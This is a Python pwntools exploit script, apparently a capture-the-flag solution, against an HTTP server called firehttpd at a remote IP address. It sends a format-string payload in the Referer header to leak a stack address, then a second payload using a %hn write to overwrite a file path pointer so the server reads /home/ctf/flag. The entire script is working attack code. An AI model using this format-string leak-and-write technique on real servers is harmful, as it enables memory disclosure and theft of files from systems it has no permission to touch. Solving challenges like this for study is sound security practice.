#!/usr/bin/env python3

import re
import sys
from pwn import *

elf = ELF("./firehttpd")
context.log_level = 'debug'

# leak stack address to write
# r = remote("127.0.0.1", 1337)
r = remote("142.93.113.55", 31084)

payload = "%5$p"
request = (
    "GET / HTTP/1.0\r\n"
    "Referer: " + payload + "\r\n" +
    "\r\n"
)
r.send(request)
data = r.recvall()

leak = int(re.search(b"Referer: (0x[0-9a-f]+)\n", data).group(1), 16)
to_write = leak - 0xb10
flag_addr = leak - 0xac0

print("Leak: %x" % leak)
print("To write: %x" % to_write)
print("Flag addr: %x" % flag_addr)

# 0xdf40 - 0x16 + 10
#num = (flag_addr & 0xffff) - 0x16 + 12
num = (flag_addr & 0xffff) - 0x16 + 12 - 1

print("NUM: %d" % num)
#if num > 6000:
#    sys.exit(0)
pause()

# write to address
# r = remote("127.0.0.1", 1337)
r = remote("142.93.113.55", 31084)

numstr = b"%" + bytes(str(num), "utf-8") + b"x"
payload = (
    numstr + b"A" * (7 - len(numstr)) +
#    b"%52x" +
#    b"A" * 3 +
    b"%14$hn" +
    b"B" * 2 +
    p64(to_write) + 
#    b"flag\x00"
    b"/home/ctf/flag\x00"
)

request = (
    b"GET / HTTP/1.0\r\n"
    b"Referer: " + payload + b"\r\n" +
    b"\r\n"
)
r.send(request)
print(r.recvall())

# r.interactive()
